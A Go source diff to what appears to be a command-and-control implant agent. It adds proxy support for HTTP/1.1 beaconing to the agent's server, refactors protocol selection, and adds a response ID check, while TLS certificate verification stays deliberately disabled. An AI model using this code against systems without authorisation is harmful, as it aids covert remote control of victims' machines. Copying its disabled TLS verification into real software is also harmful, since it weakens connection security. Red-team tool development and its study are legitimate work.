@@ -33,6 +33,7 @@ import (
 	"math/rand"
 	"net"
 	"net/http"
+	"net/url"
 	"os"
 	"os/user"
 	"path/filepath"
@@ -96,7 +97,7 @@ type Agent struct {
 }
 
 // New creates a new agent struct with specific values and returns the object
-func New(protocol string, url string, psk string, verbose bool, debug bool) Agent {
+func New(protocol string, url string, psk string, proxy string, verbose bool, debug bool) Agent {
 	if debug {
 		message("debug", "Entering agent.New function")
 	}
@@ -156,8 +157,7 @@ func New(protocol string, url string, psk string, verbose bool, debug bool) Agen
 			}
 		}
 	}
-
-	client, errClient := getClient(a.Proto)
+	client, errClient := getClient(a.Proto, proxy)
 	if errClient == nil {
 		a.Client = client
 	} else {
@@ -199,6 +199,8 @@ func New(protocol string, url string, psk string, verbose bool, debug bool) Agen
 		message("info", fmt.Sprintf("\tHostname: %s", a.HostName))
 		message("info", fmt.Sprintf("\tPID: %d", a.Pid))
 		message("info", fmt.Sprintf("\tIPs: %v", a.Ips))
+		message("info", fmt.Sprintf("\tProtocol: %s", a.Proto))
+		message("info", fmt.Sprintf("\tProxy: %v", proxy))
 	}
 	if debug {
 		message("debug", "Leaving agent.New function")
@@ -372,7 +374,7 @@ func (a *Agent) statusCheckIn() {
 }
 
 // getClient returns a HTTP client for the passed in protocol (i.e. h2 or hq)
-func getClient(protocol string) (*http.Client, error) {
+func getClient(protocol string, proxyURL string) (*http.Client, error) {
 
 	/* #nosec G402 */
 	// G402: TLS InsecureSkipVerify set true. (Confidence: HIGH, Severity: HIGH) Allowed for testing
@@ -387,19 +389,39 @@ func getClient(protocol string) (*http.Client, error) {
 		NextProtos: []string{protocol},
 	}
 
-	if protocol == "hq" {
+	switch strings.ToLower(protocol) {
+	case "hq":
 		transport := &h2quic.RoundTripper{
 			QuicConfig:      &quic.Config{IdleTimeout: 168 * time.Hour},
 			TLSClientConfig: TLSConfig,
 		}
 		return &http.Client{Transport: transport}, nil
-	} else if protocol == "h2" {
+	case "h2":
 		transport := &http2.Transport{
 			TLSClientConfig: TLSConfig,
 		}
 		return &http.Client{Transport: transport}, nil
+	case "http/1.1":
+		if proxyURL != "" {
+			rawURL, errProxy := url.Parse(proxyURL)
+			if errProxy != nil {
+				return nil, fmt.Errorf("there was an error parsing the proxy string:\r\n%s", errProxy.Error())
+			}
+			proxy := http.ProxyURL(rawURL)
+			transport := &http.Transport{
+				TLSClientConfig: TLSConfig,
+				Proxy:           proxy,
+			}
+			return &http.Client{Transport: transport}, nil
+		}
+
+		transport := &http.Transport{
+			TLSClientConfig: TLSConfig,
+		}
+		return &http.Client{Transport: transport}, nil
+	default:
+		return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 	}
-	return nil, fmt.Errorf("%s is not a valid client protocol", protocol)
 }
 
 // sendMessage is a generic function to receive a messages.Base struct, encode it, encrypt it, and send it to the server
@@ -495,11 +517,16 @@ func (a *Agent) sendMessage(method string, m messages.Base) (messages.Base, erro
 			return returnMessage, errDecrypt
 		}
 
+		// Verify UUID matches
+		if respMessage.ID != a.ID {
+			if a.Verbose {
+				return returnMessage, fmt.Errorf("response message agent ID %s does not match current ID %s", respMessage.ID.String(), a.ID.String())
+			}
+		}
 		return respMessage, nil
 	default:
 		return returnMessage, fmt.Errorf("%s is an invalid method for sending a message", method)
 	}
-
 }
 
 // messageHandler looks at the message type and performs the associated action
